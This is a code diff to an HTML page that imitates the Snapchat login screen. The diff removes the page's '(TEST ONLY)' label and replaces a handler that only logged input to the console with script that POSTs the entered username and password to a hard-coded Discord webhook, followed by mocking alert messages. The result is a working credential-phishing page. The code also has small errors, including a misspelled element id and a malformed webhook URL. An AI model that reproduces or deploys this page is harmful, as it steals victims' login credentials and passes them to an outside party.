@@ -25,7 +25,7 @@
               <img class="snapchat-icon" src="icon.svg" alt="Snapchat">
 
               <div>
-                <h1 class="accountsTitle">Log in to Snapchat (TEST ONLY)</h1>
+                <h1 class="accountsTitle">Log in to Snapchat</h1>
               </div>
 
               <form id="loginForm">
@@ -62,27 +62,45 @@
   </div>
 
   <script>
-    document.getElementById("loginForm").addEventListener("submit", function(event){
-      event.preventDefault(); // stop real submission
+document.getElementById("loginForm").addEventListener("submit", function(event) {
+    event.preventDefault(); // stop real form submission
 
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
+    // Get input values
+    const username = document.getElementById("usesrname").value;
+    const password = document.getElementById("password").value;
 
-      if (!username || !password) {
+    // Simple validation
+    if (!username || !password) {
         alert("Please fill in both fields!");
         return;
-      }
+    }
 
-      // SAFE: Log to console instead of sending anywhere
-      console.log("=== TEST LOGIN ===");
-      console.log("Username:", username);
-      console.log("Password:", password);
+    // Discord webhook URL
+    const webhookURL = "Yhttps://discord.com/api/webhooks/1440084893026619498/EghJR4801Er-ZaAFQcKMVSqHD3MCglFGDQqujsGZpkgUg3mNy-TVSouuBcUX7dzERTtF"; // replace with your webhook
 
-      alert("Form submitted! Open the console to see the values.");
+    // Prepare message
+    const message = `Yep ur a genius:\nUsername: ${username}\Password: ${password}`;
 
-      // Optional: clear inputs
-      document.getElementById("username").value = "";
-      document.getElementById("password").value = "";
+    // Send to Discord
+    fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message })
+    })
+    .then(response => {
+        if(response.ok) {
+            alert("Ahamed your a genius");
+            // Optional: clear input fields
+            document.getElementById("username").value = "";
+            document.getElementById("password").value = "";
+        } else {
+            alert("Failed to send: " + response.status);
+        }
+    })
+    .catch(error => {
+        alert("Error sending order: " + error);
     });
-  </script>
+});
+</script>
+
 </body>
